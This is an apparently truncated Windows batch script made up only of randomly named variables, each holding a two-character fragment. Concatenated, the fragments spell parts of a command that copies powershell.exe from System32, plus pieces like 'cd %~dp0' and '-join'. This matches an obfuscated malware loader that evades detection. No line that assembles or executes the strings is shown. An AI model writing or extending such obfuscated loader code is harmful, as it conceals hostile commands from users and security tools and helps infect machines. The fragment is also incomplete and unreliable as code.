@echo off
set "AmZLVayoNf=we"
set "kITrDTgkEB=he"
set "JPctRoObnU=nd"
set "WOHDaGgTRH=y "
set "LaWSNRsHhb=1."
set "sOSDHtvYbC=po"
set "MLlyVsfaaO=ws"
set "aBBoovIHKn=Wi"
set "vFXXqhfVgG=:\"
set "zCWTwNzMlm= /"
set "OOssdINxlY=s\"
set "ToKlyFNhaX=0\"
set "GZbFlGDEfc=Sy"
set "wuFFpOJsuS=ll"
set "jToWCdntYl=do"
set "LfErQGVhnS=we"
set "DABHjSTCih=co"
set "RAUuUpJTgr=in"
set "tdIlwSRnDQ=st"
set "msCqpLdWxT=xe"
set "KGUhQnwrCb=.e"
set "NqMesawvuX=Po"
set "URnUqahbFm=\v"
set "hfsBbGgcvK=rs"
set "erqiyUwJpj=em"
set "xMiLyfovzC=rS"
set "AqQonkffce=32"
set "GRZaKAMzDV=ll"
set "jpMzupHMSU= C"
set "dooIJTKyZe=py"
set "khKnLxqrrC=ow"
set "UMlpiKggWl=\W"
set "nabHUWhsku=he"
set "HfgKuVptgD=cd"
set "mxOWFDOyLA= %~dp0"
set "ZwKblYcxTy=-4] "
set "hlcszoTbnM=-joi"
